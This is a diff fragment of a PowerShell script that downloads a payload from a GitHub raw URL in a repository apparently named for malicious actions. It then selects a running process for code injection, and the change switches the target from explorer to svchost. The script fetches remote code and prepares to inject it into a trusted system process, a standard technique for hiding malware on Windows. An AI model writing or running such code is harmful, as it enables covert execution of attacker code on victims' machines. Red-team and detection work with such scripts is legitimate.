@@ -5,7 +5,7 @@ $payloadUrl = "https://raw.githubusercontent.com/norsemen-local/Malicious-Action
 $payload = Invoke-WebRequest -Uri $payloadUrl -UseBasicParsing | Select-Object -ExpandProperty Content
 
 # Choose a common process for injection
-$processName = "explorer" # Alternatively, use "notepad", "svchost", etc.
+$processName = "svchost" # Alternatively, use "notepad", "svchost", etc.
 $process = Get-Process -Name $processName | Select-Object -First 1
 
 # Create a byte array of the payload
